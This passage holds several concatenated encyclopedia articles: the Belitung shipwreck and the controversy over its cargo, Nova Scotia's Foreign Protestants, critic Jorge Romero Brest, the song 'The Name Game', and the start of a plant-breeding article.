of CSIRO, a wood identification specialist. Many of the samples were too badly deteriorated to be positively identified, as the lack of cellulose remaining in the wood cells prevented successful analysis. Many types of wood have been positively identified: teak (Tectona grandis) was used for the through-beams and is resilient to the teredo worm (of the family Teredinidae), the ceiling was made from a genus Cupressus tree which was possibly Cupressus torulosa, the stem-post is made of rosewood from the family Leguminosae (now called the Fabaceae) and either the genus Dalbergia or Pterocarpus. The wooden box found in the stern area of the shipwreck was made from the genus Artocarpus of the mulberry family, Moraceae. The species used for the hull planks was not positively identified but is thought to be Amoora of the family Meliaceae. The timber for the frames was similarly not definitively determined, although one frame was probably of Amoora or of the genus Afzelia of the family Fabaceae. Afzelia is interesting in that the three main species A. africana, A. bipindensis and A. pachyloba are mostly found in a small part of Africa, stretching from the mid-western coast in a thin band towards the east coast and stopping short of it by a couple of hundred miles. The ship could originally have been said to be of Arabian or Indian origin, as there is little to differentiate between ships of the area during that period, in regard to construction techniques‚Äîthough its frame uses a species of tree that is only found in a small part of Africa. After analysing the hull form, timber species, and construction methods, Ilic concluded that the wreck was of Indian or Arabian origin. India was considered the more probable place of construction but Arabian construction was not ruled out, as the timber used was commonly imported to the Middle East for use in shipbuilding. Flecker concluded that the wreck was an Arabian ship in his 2010 chapter from the Sackler exhibition catalogue, arguing that \\"from an analysis of construction methods and materials and hull form, the author has determined that the Belitung wreck is an Arab vessel.\\" =Legacy= Present-day knowledge of the original materials and methods used in construction of this particular Arab dhow stems largely from the shipwreck itself. The Jewel of Muscat reconstruction, a replica made as an exact copy of the wreck, has shown that the ship resembles a baitl qarib, a type of ship still found in Oman today. Amongst the hull of the shipwreck were large lumps of concretion containing artefacts from the ship's cargo dated to the Tang dynasty of China around 800 AD, and from where the wreck gets its other names, the \\"Tang shipwreck\\" or \\"Tang treasure ship\\". The ship's timbers and artefacts were shown to the public for the first time in 2011. The world debut exhibition of the collection of artefacts, as well as timbers from the ship, took place in the ArtScience Museum, adjacent to Singapore's Marina Bay Sands. The significance of the discovery of the shipwreck led to the decision to construct the Jewel of Muscat as an exact reconstruction of the shipwrecked dhow. Cargo and \\"Tang treasure\\" The wreck held three main types of \\"wares\\" in the form of bowls: Changsha ware (produced in kilns in Tongguan), the majority of the 60,000 items, were originally packed in either straw cylinders or \\"Dusun\\" storage jars; White-ware, manufactured in the Ding kilns and including the earliest known intact underglaze blue and white dishes; and Yue ware from Zhejiang Province. One Changsha bowl was inscribed with a date: \\"16th day of the seventh month of the second year of the Baoli reign\\", or 826 AD. This was later confirmed by radiocarbon dating of star anise found amongst the wreck. The cargo had a surprising variety of influences and markets, including Buddhist lotus symbols, motifs from Central Asia and Persia, Koranic inscriptions, and green-splashed bowls popular in Iran. Included in the cargo were items of varying purposes, from spice jars (martaban) and ewers to inkwells, funeral urns and gilt-silver boxes. The cargo was described by John Guy of the Metropolitan Museum of Art in New York as \\"the richest and largest consignment of early ninth-century southern Chinese gold and ceramics ever discovered in a single hoard.\\" The cargo also included spices and resin, and metal ingots used as ballast. There were also special items found which include a gold cup‚Äîthe largest Tang dynasty gold cup ever found‚Äîand a large silver flask decorated with a pair of ducks. The gold cup has pictures of people in various actions on its sides, such as musicians and a Persian dancer. It also has images of two men on its thumb plate with features that appear to be non-Chinese, as they are depicted with curly hair. {- valign=top Bowls from kilns in Changsha, Hunan repouss√© among chased flowers A pair of square lobed gold dishes with chased insects, flowers and knotted ribbons An octagonal gold cup with a thumb plate at the top of its handle } =Current disposition= { style=\\"float: right;\\" - valign=top ewer with lugs, a dragon-head spout, and feline-shaped handle; From North China (perhaps Hebei)alt= glazed stoneware with copper-green splashes over a white slip; probably from the Gongxian kilns, Henanalt= } Tilman Walterfang's company formed a contract of cooperation with the original Indonesian salvage company and as a result the cargo was not sold off piece by piece to collectors. Although there were instances of some looting from the site, particularly between the two excavation periods, Walterfang kept the cargo intact as one complete collection so that it could be studied in its original context; something which has given an \\"unparalleled insight into China's industrial capacity and global trade\\" according to Julian Raby, director of the Arthur M. Sackler Gallery. It was housed in a private conservation facility for six years, where the artefacts were painstakingly conserved (including desalination), studied, and carefully restored by Walterfang's company, Seabed Explorations Ltd of New Zealand. The work was carried out with the assistance of German conservator Andreas Rettel, who trained at the R√∂misch-Germanisches Zentralmuseum in Mainz. The artefacts were authenticated by Professor Geng Baochang, a senior research fellow at the Palace Museum in Beijing. Geng is the deputy director of Beijing's Forbidden City and one of China's foremost experts on antique ceramics. The cargo was purchased for around 32 million USD by a private company, the Sentosa Leisure Group (now the Sentosa Development Corporation), and the Singaporean government in 2005, and loaned to the Singapore Tourism Board. The debut exhibit of the treasure ran from 19 February 2011 to 31 July 2011 at the ArtScience Museum in Singapore. The display was put on with the collaboration of the Smithsonian Institution, The Freer Gallery of Art, the Arthur M. Sackler Gallery, the Singapore Tourism Board, and the National Heritage Board of Singapore. The exhibition was then scheduled to travel the world for approximately five years, to venues which include museums of major importance throughout Asia, Australia, Europe, the Middle East, and the United States. In April 2015, it was announced that the Asian Civilisations Museum would house the Tang Shipwreck collection. The treasure has now found a permanent home, as the Tang Shipwreck, in the Khoo Teck Puat Gallery of the Asian Civilisations Museum, in Singapore. Controversy The Sackler Gallery, part of the Smithsonian Institution, was due to host the US premiere exhibition of the Belitung cargo in early 2012‚Äîa date set to coincide with the Smithsonian museum's 25th anniversary celebration. On 28 June 2011 it was reported that the museum was postponing the show. The Sackler Gallery has received condemnation of the exhibition due to the time-frame and nature of the original excavation of the artefacts; with arguments put forwards about whether the display should be allowed. According to The New York Times, \\"a group of archaeologists and anthropologists from the National Academy of Sciences ‚Äî including Robert McCormick Adams, a former leader of the Smithsonian\\" wrote to the head of the Smithsonian Institution, G. Wayne Clough, on 5 April 2011 claiming that \\"proceeding with the exhibition would 'severely damage the stature and reputation' of the institution.\\" Proponents of the arguments against display say that the excavation was for commercial gain and conducted so quickly as to have caused a loss of information pertaining to the crew and cargo. The New York Times article goes on to say that further comments were made by \\"the Society for American Archaeology, the Council of American Maritime Museums and the International Committee for Underwater Cultural Heritage, as well as groups within the Smithsonian, including the members of the anthropology department and the Senate of Scientists at its National Museum of Natural History\\" all asking that the Smithsonian reconsider the exhibition. There are also claims that exhibiting the artefacts would be against international agreements on underwater excavations. Kimberly L. Faulk, a marine archaeologist and vice chairwoman of the non-governmental Advisory Council on Underwater Archaeology said that, \\"by proceeding with the exhibition the Smithsonian ‚Äî which is a research institution as well as a network of museums ‚Äî would be violating its own set of professional ethics and promoting the looting of archaeological sites.\\" Proponents of the arguments to display the works claim that the excavation was indeed legal as the work was carried out in accordance with Indonesian law, at the request of the Indonesian government, and in accordance with international laws at the time. James P. Delgado, director of maritime heritage at the United States Department of Commerce National Oceanic and Atmospheric Administration, said that \\"allowing any of the finds from an excavation to be sold betrays the most basic aspects of research\\" with the New York Times going on to report that, \\"he [Delgado] wished the Belitung shipwreck had been academically excavated. But unlike some of his colleagues, he said that instead of canceling the exhibition, the Smithsonian could use it to educate the public about the consequences of the commercialization of underwater heritage.\\" Walterfang has stated that \\"the overall situation would without doubt be described as 'less than ideal'\\" and that \\"the Indonesian government, fearful of looting, ordered Seabed Explorations to begin an immediate round- the-clock recovery operation.\\" Some academics have expressed more definitive support for Tilman Walterfang‚Äôs excavation and treatment of the Belitung vessel and cargo. Lu Caixia, a researcher at the Institute of Southeast Asian Studies in Singapore, states in the newsletter of the International Institute for Asian Studies, Leiden, Netherlands, that ‚Äúthe excavation of the Belitung has been acknowledged as an admirable example of what can be achieved under difficult conditions in Southeast Asia.‚Äù She points out that unlike some other commercial operators, Walterfang‚Äôs company ensured that ‚Äúthe ship structure itself was properly recorded, the cargo was kept together rather than dispersed, and the finds were well conserved, studied, catalogued, and published.\\" Lu ends by highlighting the efficacy of the public-private arrangement: ‚ÄúIt is difficult to imagine how this particular project could have been financed or organized without commercial involvement.‚Äù http://nsc.iseas.edu.sg/documents/iias_newsletter/belitung_controversy.pdf (page 42) Prof. Victor H. Mair, Professor of Chinese Language and Literature in the Department of East Asian Languages and Civilizations at the University of Pennsylvania, Philadelphia, United States defends the Smithsonian exhibition, claiming that the ‚Äúeducational and historical value of the collection is simply enormous, and those who have called for the cancellation of the exhibition are, in effect and in fact, denying access to the wealth of information embodied in the Belitung shipwreck, both to the lay public and to qualified researchers.\\" Dr. Sean Kingsley, Director of Wreck Watch International reminds that \\"Wrecks like these should be ‚Äòfeel good‚Äô factors at times when the world has very serious and painful natural, economic and civil disasters to contend with\\" and \\"it hardly needs stating that no European and American museum collection is whiter than white.\\" In an interview with the Science Journal G. Wayne Clough, the 12th secretary of the Smithsonian Institution assuaged the animosities between critics and proponents of the exhibition: ‚ÄúSo I don't think there's anything negative here. I think the Smithsonian tried to do it right. When we heard the concerns, we asked the community to come together and talk about it, and we listened, and some people in that audience had their minds changed, as a matter of fact, but not everybody. So, I think it's time in a situation like this to pause, and for the profession itself to say, \\"Okay, there's a problem, what are you going to do about it? And, you remember, the United States never signed the UNESCO treaty.‚Äù =Conventions by international organisations= The Underwater Archaeology Resolutions that were adopted on 10 September 1993 by the International Congress of Maritime Museums (ICMM) state that: They also say that, \\"ICMM members should recognize that artefacts from underwater sites are integral parts of archaeological assemblages, which should remain intact for research and display\\" and that, \\"a commercially exploited heritage site is one in which the primary motive for investigation is private financial gain.\\" The United Nations Educational, Scientific and Cultural Organization (UNESCO) ratified a set of rules for preserving and excavating underwater sites at the Convention on the Protection of the Underwater Cultural Heritage during 15 October ‚Äî 5 November 2001. Though the rules set out at the meeting do include preserving artefacts in situ\\"The preservation in situ of underwater cultural heritage shall be considered as the first option before allowing or engaging in any activities directed at this heritage.\\" as the preferable option they go on to say: See alsoCirebon shipwreck *ArtScience Museum *Jewel of Muscat *Belitung Notes References External linksA photograph of the Jewel of Muscat, housed in the ArtScience Museum *ArtScience Museum website *Seabed Explorations website *Tilman Walterfang Manifesto *From Beneath, A Smithsonian Shipwreck Controversy, NPR *Story about ship's discovery, The Independent 830s 9th-century artifacts 1998 archaeological discoveries Tang dynasty Shipwrecks of Indonesia Shipwrecks in the Indian Ocean ","title":"Belitung shipwreck"},{"id":"30876035","text":"Little Dutch (Deutsch) Church, Halifax, Nova Scotia The Foreign Protestants were a group of French Lutheran and German Protestant immigrants to Nova Scotia. They largely settled in Halifax at Gottingen Street (named after the German town of G√∂ttingen) and Dutch Village Road as well as Lunenburg. History In 1749, the British colony of Nova Scotia was almost completely populated by native Mi'kmaq and 10,000 French-speaking and Roman Catholic Acadians. The British, specifically the Board of Trade, wanted to settle Protestants in the region. Attracting British immigrants was difficult since most preferred to go to the warmer southern colonies. Thus, a plan was developed to aggressively recruit foreign Protestants, who came mostly from German duchies and principalities on the Upper Rhine, now in the German states of Rhineland-Palatinate. The Duchy of W√ºrttemberg was the major source, which included the French region of Montbeliard, and there were also \\"Foreign Protestants\\" from what is now the tripoint of France, Germany and Switzerland. The recruiting drive was led by John Dick, who was quite successful. The British government agreed to provide free passage to the colony, free land, and one year of rations upon arrival. Over 2,000 of the \\"Foreign Protestants\\" arrived between 1750 and 1752, in 12 ships:The EmigrationGlossems on Historical Events *Alderney (1750) *Nancy (1750) *Ann (1750) *Gale (1751) *Speedwell (1751) *Pearl (1751) *Murdoch (1751) *Speedwell (1752) *Betty (1752) *Sally (1752) *Pearl (1752) *Gale (1752) The immigrants disembarked at Halifax, where they were put in temporary quarters. The Foreign Protestants stayed at Halifax to assist the British in building the new outpost. They built their own chapel in Halifax, Little Dutch (Deutsch) Church. And had to wait for their promised lands. Many of the Foreign Protestants settled Lunenburg, Nova Scotia. In the early years, their living conditions resulted in Lunenburg Rebellion. The Foreign Protestants also faced numerous Mi'kmaw attacks, such as the Raid on Lunenburg (1756). Legacy Most of the foreign Protestants settled along the South Shore between Liverpool and Halifax. The area is still inhabited by their descendants, and last names like, Berghaus (anglicized to Barkhouse), Corkum, Creaser, Crouse, Ernst, Himmelman, Hebb, Hirtle, Lohnes, Joudrey, Knickle, Morash, Naas, Rehfus (anglicized to Rafuse), Reichert (anglicised to Richards), Schmidt (anglicised to Smith), Teubert (anglicised to Tibert), Vogler, Wile, Zinck, Zwicker, or the various ways to spell Rhodeniser are common. Many towns such as Lunenburg, bear distinctly German names. While places adapted to the cultural and business requirements including Bridgewater and Riverport. Many of the names of islands, beaches, and points like Kingsburg are also German. In the mid-18th century, the Foreign Protestants were the ethnonymic basis behind the name \\"New Brunswick\\", as well as support behind naming \\"Prince Edward Island\\" for a representative of the Braunschweiger dynasty.

His father, Enrique Romero Brest, established the National Institute of Physical Education. Jorge Brest began writing for his father's sports magazine, Revista de Educaci√≥n F√≠sica. His research for these articles familiarized him with Andr√© Dunoyer de Segonzac's illustrations on the subject, and he developed an intellectual interest in art. He enrolled at the University of Buenos Aires in 1926, earned a Law degree in 1933, and married Amelia Rossi.Archivo Romero Brest: Autobiograf√≠a His interest in art theory as a hobby resulted in his first book, El problema del arte y del artista contempor√°neos (The Problems of Contemporary Art and Artists), in 1937. Brest was a talented speaker, and first gained renown as an art critic and commentator in a 1943 conference entitled \\"The element of rhythm in film and sports.\\" He wrote columns on the philosophy of sport for the socialist newspaper La Vanguardia at the invitation of its editor, Mario Bravo, in 1939 and 1940.Revista Primera Plana (April 1967): Jorge Romero Brest. Romero Brest became known as a confrontational art critic, and was initially disdainful of Surrealism in art, writing highly critical reviews of an exhibit by Orion Group painter Luis Barrag√°n and others, recommending they first \\"learn to paint\\". He then published a biography of the renowned Argentine Realist painter Prilidiano Pueyrred√≥n, in 1942, and a study of Michelangelo's famed David, in 1943. He published the first two volumes of his History of Art in 1945, publishing the third and fourth in 1946 and 1958, respectively. This latter work was subsequently used as a textbook in several Latin American universities. The affiliation of many in the arts with the Socialist Party led to harassment by government officials, particularly by the populist President Juan Per√≥n. In 1947, Per√≥n ordered the Altamira Art Academy dissolved, leaving painters Emilio Pettoruti and Ra√∫l Soldi, sculptor Lucio Fontana, and Romero Brest, who served as the academy's art history professor, among others, without a teaching post. Brest continued an active schedule of conferences and workshops, and founded the arts review journal Ver y Estimar (Look and Consider). He taught a course in Aesthetics and Art History at the Fray Mocho bookstore, and drew large numbers of students. His 1952 text, La pintura europea contempor√°nea (Contemporary Painting in Europe), was a success, and a series of international seminars followed. The military dictatorship that overthrew Per√≥n in 1955 named Brest director of the National Museum of Fine Arts. Both the museum and its collections were modernized and expanded during his tenure as director. A temporary exhibits pavilion was opened in 1961, and the museum acquired a large volume of modern art though its collaboration with the Torcuato di Tella Institute, a leading promoter of local avant-garde artists.Instituto Di Tella: Promoci√≥n del arte. Experimentaci√≥n audiovisual. Investigaci√≥n y financiaci√≥n art√≠stica Among the artists whose work Brest introduced to the museum were Ra√∫l Soldi, H√©ctor Basald√∫a, Guillermo Butler, Lino Enea Spilimbergo, Emilio Pettoruti, and Ram√≥n G√≥mez Cornet, as well as painters from the same Orion Group whose work he lampooned in the 1940s. He organized the museum's first Abstract Art exposition in 1960, showing works by Sarah Grilo, Jos√© Antonio Fern√°ndez Muro, Octavio Ocampo, Kazuya Sakai, and Clorindo Testa, and its first exhibit of Neo-figurative art in 1963, with works by Jorge de la Vega, Luis Felipe No√©, Ernesto Deira, and R√≥mulo Macci√≥, known among local art circles as the \\"four horsemen of the apocalypse\\".Jorge Romero Brest. La cultura como provocaci√≥n. Buenos Aires: Ediciones de autor, 2006. Brest resigned from his post at the National Fine Arts Museum in 1963, and was named director of the Center for Visual Arts at the Torcuato di Tella Institute. The institute then became the leading Argentine center for pop art, experimental theatre, and conceptual art, drawing artists such as Le√≥n Ferrari, Nacha Guevara, Gyula Kosice, Nicol√°s Garc√≠a Uriburu, and Antonio Segu√≠. Brest also promoted the center's famed Happenings, notably those of Marta Minuj√≠n, whose interactive displays and mazes helped make the institute Buenos Aires' mazana loca (city block of madness).P√°gina/12 (5/24/1998) The director's often challenging style did not endear him to all whose work bore his scrutiny, and some became his enemies over the years. These conflicts were satirized by a Happening staged by Federico Manuel Peralta, in which a tug-of-war was arranged on Florida Street with many of the institute's artists on one end, and the unflappable Brest on the other.P√°gina/12: El gran Romero Brest The 1966 military coup limited freedom of expression at the institute and elsewhere. Facing conditions such as this, numerous avant-garde artists (and others, particularly in academia) left Argentina, many never to return.Crawley, Eduardo. A House Divided: Argentina 1880‚Äì1980. St. Martin's Press, 1985. Brest's tenure ended in 1969, and the institute closed shortly afterward. He published Ensayo sobre la contemplaci√≥n art√≠stica (Essay on Artistic Contemplation), and explained that his promotion of avant-garde art at the center had been based on creative input from the artists, and \\"a certain objective quality, not just a belated imitation of European movements.\\" He also served as a jurist in numerous international biennales, notably for a number of Venice Biennales and for Documenta IV (Kassel, Germany), in 1968. He retired upon the closure of the Center for Visual Arts, though his byline appeared in occasional reviews for art magazines in Argentina and Colombia. Brest lived during this period in a distinctive blue house in suburban City Bell designed for him by one of the artists made famous at the Di Tella Institute: Edgardo Gim√©nez. The residence was peculiar also for Brest's bed, which was suspended five feet (1.5 m) off the ground, and could only be accessed by a ladder. Brest was frank when discussing the neurosis, which had earned him notoriety among colleagues, and admitted to having benefited as much from psychotherapy as he did from his second wife, Marta Bontempi, who chastised his irascible moments by ordering him to \\"be quiet, Enrique!\\" (in reference to Brest's disciplinarian father). He later relocated to a northside Buenos Aires apartment, and died in 1989, at age 83.

History It was written by American singer Shirley Ellis and Lincoln Chase, and Ellis's recording, produced by Charles Calello, was released during late 1964 as \\"The Name Game\\". The record scored number 3 on the Billboard Hot 100, and number 4 on the magazine's R&B; charts during 1965. The record was re- released in 1966 and again in 1973. A Rhythm & Blues singer for 10 years before that success, Ellis was also successful with \\"The Clapping Song (Clap Pat Clap Slap)\\" (#8 pop and #16 R&B;), and \\"The Nitty Gritty\\" (#8 on the Hot 100 and #4 on the Cash Box R&B; chart). Ellis performed \\"The Name Game\\" on major television programs of the day, including Hullabaloo, American Bandstand and The Merv Griffin Show. The song later became a popular children's singalong. \\"The Name Game\\" has been recorded by dozens of recording artists in the years since, notably Laura Branigan, whose version produced by Jeff Lorber was included on her 1987 album Touch,released as the fifth single. It features a classroom of third-grade schoolchildren singing along to the game. Judy Moody, Hannah Banana, and many other phrases have been referenced from this song. Often sung by relative unknowns for collections of songs for children, other cover versions have been recorded by artists as diverse as Dean Ford and the Gaylords (1965), Divine (1980), and Soupy Sales (1965). The Brazilian singer Xuxa recorded a song using the same play and the same sample in the song \\"Jogo da Rima\\". In 1965, singer Olivia Molina recorded a Spanish version, \\"Juego De Palabras\\". In 1975, Anne Ren√©e recorded \\"Un jeu d'fou\\" in French. Joanie Bartels covered the song with different names, releasing it as a single from the 1980 album, Sillytime Magic and the 1994 video The Extra-Special Substitute Teacher. In 1982, Stacy Lattisaw's \\"rap\\" recording \\"Attack of the Name Game\\" scored #70 on the Hot 100. In 1990, Cree Summer Francks (as Elmyra) performed a cover version of the song for an episode of Tiny Toon Adventures using the Tiny Toons' names (except Plucky Duck's, as mentioned by that episode's end credits). In 1993, this song was used in television commercials for Little Caesars Pizza's kids meals with a free toy, performed by The Little Caesars, sequeling the \\"Wooly Bully\\" commercials from 1992. Stacy's version was sampled by Mariah Carey on her 1999 single \\"Heartbreaker\\", from her album Rainbow. Character Sister Jude (Jessica Lange) sang her version of the song in season 2 episode 10 \\"The Name Game\\" of American Horror Story. Sheldon Cooper in Season 9 Episode 21 briefly sings \\"The Name Game\\" in The Big Bang Theory. In 1997, Linda Tillery and the Cultural Heritage Choir covered the song with alternate names from the album Shakin' a Tailfeather. Ellis told Melody Maker magazine that the song was based on a game she played as a child. On May 3, 2017, Howard Stern stated that he sings this song to young children, and calls it \\"his secret weapon\\" saying \\"it not only comforts them, it also distracts them from [his] unsightly features\\". Rules Using the name Katie as an example, the song follows this pattern: :Katie, Katie, bo-batie, :Bonana-fanna fo-fatie :Fee fi mo-matie :Katie! A verse can be created for any name with stress on the first syllable, with X as the name and Y as the name without the first consonant sound (if it begins with a consonant), as follows: :(X), (X), bo-b (Y) :Bonana-fanna fo-f (Y) :Fee fi mo-m (Y) :(X)! If the name starts with a b, f, or m, that sound simply is not repeated. For example: Billy becomes \\"Billy Billy bo-illy\\"; Fred becomes \\"bonana fanna fo-red\\"; Marsha becomes \\"fee fi mo-arsha\\" The song as originally performed gives no indication of what to do with names where the stress falls on a syllable after the first, like Anita or Antoinette, however, the cover version on the workout video Sweatin' to the Oldies 3 (vocals by Donna Miller) suggests that the first syllable should be dropped after the name is first said; the name Madonna is sung as \\"Madonna- donna-bo-bonna,\\" etc. See also1964 in music *Nursery rhyme *Swinging the Alphabet References 1964 singles 1965 singles Laura Branigan songs Songs written by Lincoln Chase Patter songs 1964 songs Stacy Lattisaw songs Novelty songs ","title":"The Name Game"},{"id":"30876044","text":"The Yecoro wheat (right) cultivar is sensitive to salinity, plants resulting from a hybrid cross with cultivar W4910 (left) show greater tolerance to high salinity Plant breeding is the science of changing the traits of plants in order to produce desired characteristics.Breeding Field Crops. 1995. Sleper and Poehlman. Page 3 It has been used to improve the quality of nutrition in products for humans and animals. The goals of plant breeding are to produce crop varieties that boast unique and superior traits for a variety of agricultural applications. The most frequently addressed traits are those related to biotic and abiotic stress tolerance, grain or biomass yield, end- use quality characteristics such as taste or the concentrations of specific biological molecules (proteins, sugars, lipids, vitamins, fibers) and ease of processing (harvesting, milling, baking, malting, blending, etc.). Plant breeding can be accomplished through many different techniques ranging from simply selecting plants with desirable characteristics for propagation, to methods that make use of knowledge of genetics and chromosomes, to more complex molecular techniques (see cultigen and cultivar). Genes in a plant are what determine what type of qualitative or quantitative traits it will have. Plant breeders strive to create a specific outcome of plants and potentially new plant varieties. It is practiced worldwide by individuals such as gardeners and farmers, and by professional plant breeders employed by organizations such as government institutions, universities, crop-specific industry associations or research centers. International development agencies believe that breeding new crops is important for ensuring food security by developing new varieties that are higher yielding, disease resistant, drought tolerant or regionally adapted to different environments and growing conditions.  History  Plant breeding started with sedentary agriculture and particularly the domestication of the first agricultural plants, a practice which is estimated to date back 9,000 to 11,000 years. Initially early farmers simply selected food plants with particular desirable characteristics, and employed these as progenitors for subsequent generations, resulting in an accumulation of valuable traits over time. Grafting technology had been practiced in China before 2000 BCE. By 500 BCE grafting was well established and practiced. Gregor Mendel (1822‚Äì84) is considered the \\"father of genetics\\". His experiments with plant hybridization led to his establishing laws of inheritance. Genetics stimulated research to improve crop production through plant breeding. Modern plant breeding is applied genetics, but its scientific basis is broader, covering molecular biology, cytology, systematics, physiology, pathology, entomology, chemistry, and statistics (biometrics). It has also developed its own technology.  Classical plant breeding  Selective breeding enlarged desired traits of the wild cabbage plant (Brassica oleracea) over hundreds of years, resulting in dozens of today's agricultural crops. Cabbage, kale, broccoli, and cauliflower are all cultivars of this plant. One major technique of plant breeding is selection, the process of selectively propagating plants with desirable characteristics and eliminating or \\"culling\\" those with less desirable characteristics. page=237-244 Another technique is the deliberate interbreeding (crossing) of closely or distantly related individuals to produce new crop varieties or lines with desirable properties. Plants are crossbred to introduce traits/genes from one variety or line into a new genetic background. For example, a mildew-resistant pea may be crossed with a high-yielding but susceptible pea, the goal of the cross being to introduce mildew resistance without losing the high-yield characteristics. Progeny from the cross would then be crossed with the high-yielding parent to ensure that the progeny were most like the high-yielding parent, (backcrossing). The progeny from that cross would then be tested for yield (selection, as described above) and mildew resistance and high-yielding resistant plants would be further developed. Plants may also be crossed with themselves to produce inbred varieties for breeding. Pollinators may be excluded through the use of pollination bags. Classical breeding relies largely on homologous recombination between chromosomes to generate genetic diversity. The classical plant breeder may also make use of a number of in vitro techniques such as protoplast fusion, embryo rescue or mutagenesis (see below) to generate diversity and produce hybrid plants that would not exist in nature. Traits that breeders have tried to incorporate into crop plants include: # Improved quality, such as increased nutrition, improved flavor, or greater beauty # Increased yield of the crop # Increased tolerance of environmental pressures (salinity, extreme temperature, drought) # Resistance to viruses, fungi and bacteria # Increased tolerance to insect pests # Increased tolerance of herbicides # Longer storage period for the harvested crop = Before World War II = Garton's catalogue from 1902 Successful commercial plant breeding concerns were founded from the late 19th century. Gartons Agricultural Plant Breeders in England was established in the 1890s by John Garton, who was one of the first to commercialize new varieties of agricultural crops created through cross-pollination. The firm's first introduction was Abundance Oat, one of the first agricultural grain varieties bred from a controlled cross, introduced to commerce in 1892.Spring Seed Catalogue 1899, Gartons Limited In the early 20th century, plant breeders realized that Mendel's findings on the non-random nature of inheritance could be applied to seedling populations produced through deliberate pollinations to predict the frequencies of different types. Wheat hybrids were bred to increase the crop production of Italy during the so-called \\"Battle for Grain\\" (1925‚Äì1940). Heterosis was explained by George Harrison Shull. It describes the tendency of the progeny of a specific cross to outperform both parents. The detection of the usefulness of heterosis for plant breeding has led to the development of inbred lines that reveal a heterotic yield advantage when they are crossed. Maize was the first species where heterosis was widely used to produce hybrids. Statistical methods were also developed to analyze gene action and distinguish heritable variation from variation caused by environment. In 1933 another important breeding technique, cytoplasmic male sterility (CMS), developed in maize, was described by Marcus Morton Rhoades. CMS is a maternally inherited trait that makes the plant produce sterile pollen. This enables the production of hybrids without the need for labor-intensive detasseling. These early breeding techniques resulted in large yield increase in the United States in the early 20th century. Similar yield increases were not produced elsewhere until after World War II, the Green Revolution increased crop production in the developing world in the 1960s. = After World War II = In vitro-culture of Vitis (grapevine), Geisenheim Grape Breeding Institute Following World War II a number of techniques were developed that allowed plant breeders to hybridize distantly related species, and artificially induce genetic diversity. When distantly related species are crossed, plant breeders make use of a number of plant tissue culture techniques to produce progeny from otherwise fruitless mating. Interspecific and intergeneric hybrids are produced from a cross of related species or genera that do not normally sexually reproduce with each other. These crosses are referred to as Wide crosses. For example, the cereal triticale is a wheat and rye hybrid. The cells in the plants derived from the first generation created from the cross contained an uneven number of chromosomes and as a result was sterile. The cell division inhibitor colchicine was used to double the number of chromosomes in the cell and thus allow the production of a fertile line. Failure to produce a hybrid may be due to pre- or post- fertilization incompatibility. If fertilization is possible between two species or genera, the hybrid embryo may abort before maturation. If this does occur the embryo resulting from an interspecific or intergeneric cross can sometimes be rescued and cultured to produce a whole plant. Such a method is referred to as Embryo Rescue. This technique has been used to produce new rice for Africa, an interspecific cross of Asian rice (Oryza sativa) and African rice (Oryza glaberrima). Hybrids may also be produced by a technique called protoplast fusion. In this case protoplasts are fused, usually in an electric field. Viable recombinants can be regenerated in culture. Chemical mutagens like EMS and DMS, radiation and transposons are used to generate mutants with desirable traits to be bred with other cultivars ‚Äì a process known as Mutation Breeding. Classical plant breeders also generate genetic diversity within a species by exploiting a process called somaclonal variation, which occurs in plants produced from tissue culture, particularly plants derived from callus. Induced polyploidy, and the addition or removal of chromosomes using a technique called chromosome engineering may also be used. Agricultural research on potato plants When a desirable trait has been bred into a species, a number of crosses to the favored parent are made to make the new plant as similar to the favored parent as possible. Returning to the example of the mildew resistant pea being crossed with a high-yielding but susceptible pea, to make the mildew resistant progeny of the cross most like the high-yielding parent, the progeny will be crossed back to that parent for several generations (See backcrossing ). This process removes most of the genetic contribution of the mildew resistant parent. Classical breeding is therefore a cyclical process. With classical breeding techniques, the breeder does not know exactly what genes have been introduced to the new cultivars. Some scientists therefore argue that plants produced by classical breeding methods should undergo the same safety testing regime as genetically modified plants. There have been instances where plants bred using classical techniques have been unsuitable for human consumption, for example the poison solanine was unintentionally increased to unacceptable levels in certain varieties of potato through plant breeding. New potato varieties are often screened for solanine levels before reaching the marketplace.  Modern plant breeding  Modern plant breeding may use techniques of molecular biology to select, or in the case of genetic modification, to insert, desirable traits into plants. Application of biotechnology or molecular biology is also known as molecular breeding. Modern facilities in molecular biology are now used in plant breeding. * = Marker assisted selection = Sometimes many different genes can influence a desirable trait in plant breeding. The use of tools such as molecular markers or DNA fingerprinting can map thousands of genes. This allows plant breeders to screen large populations of plants for those that possess the trait of interest. The screening is based on the presence or absence of a certain gene as determined by laboratory procedures, rather than on the visual identification of the expressed trait in the plant. The purpose of marker assisted selection, or plant genome analysis, is to identify the location and function (phenotype) of various genes within the genome. If all of the genes are identified it leads to genome sequence. All plants have varying sizes and lengths of genomes with genes that code for different proteins, but many are also the same. If a gene's location and function is identified in one plant species, a very similar gene likely can also be found in a similar location in another related species genome. = Reverse breeding and doubled haploids (DH) = Homozygous plants with desirable traits can be produced from heterozygous starting plants, if a haploid cell with the alleles for those traits can be produced, and then used to make a doubled haploid. The doubled haploid will be homozygous for the desired traits. Furthermore, two different homozygous plants created in that way can be used to produce a generation of F1 hybrid plants which have the advantages of heterozygosity and a greater range of possible traits. Thus, an individual heterozygous plant chosen for its desirable characteristics can be converted into a heterozygous variety (F1 hybrid) without the necessity of vegetative reproduction but as the result of the cross of two homozygous/doubled haploid lines derived from the originally selected plant. Plant tissue culturing can produce haploid or double haploid plant lines and generations. This cuts down the genetic diversity taken from that plant species in order to select for desirable traits that will increase the fitness of the individuals. Using this method decreases the need for breeding multiple generations of plants to get a generation that is homogenous for the desired traits, thereby saving much time over the natural version of the same process. There are many plant tissue culturing techniques that can be used to achieve haploid plants, but microspore culturing is currently the most promising for producing the largest numbers of them. = Genetic modification = Genetic modification of plants is achieved by adding a specific gene or genes to a plant, or by knocking down a gene with RNAi, to produce a desirable phenotype. The plants resulting from adding a gene are often referred to as transgenic plants. If for genetic modification genes of the species or of a crossable plant are used under control of their native promoter, then they are called cisgenic plants. Sometimes genetic modification can produce a plant with the desired trait or traits faster than classical breeding because the majority of the plant's genome is not altered. To genetically modify a plant, a genetic construct must be designed so that the gene to be added or removed will be expressed by the plant. To do this, a promoter to drive transcription and a termination sequence to stop transcription of the new gene, and the gene or genes of interest must be introduced to the plant. A marker for the selection of transformed plants is also included. In the laboratory, antibiotic resistance is a commonly used marker: Plants that have been successfully transformed will grow on media containing antibiotics; plants that have not been transformed will die. In some instances markers for selection are removed by backcrossing with the parent plant prior to commercial release. The construct can be inserted in the plant genome by genetic recombination using the bacteria Agrobacterium tumefaciens or A. 